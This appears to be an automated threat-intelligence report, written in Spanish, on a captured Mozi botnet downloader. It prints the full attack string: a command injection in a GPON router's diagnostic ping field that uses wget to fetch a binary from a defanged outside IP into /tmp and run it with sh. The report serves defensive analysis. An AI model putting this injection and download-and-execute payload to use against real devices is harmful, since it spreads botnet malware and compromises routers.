# 🧬 Payload Analysis

`d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912`

## 📌 Resumen

Texto ASCII de 319 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://202.47.56.XXX:59235/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://202.47.56.XXX:59235/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912.md](../../../../../malware-like/oraculo/downloader/d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912`
- **MD5:** `becf47cea7d7f8628ccdb921ba376d08`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.46 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://202.47.56.XXX:59235/Mozi.m+-O+- | strings |
| ip | 202.47.56.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
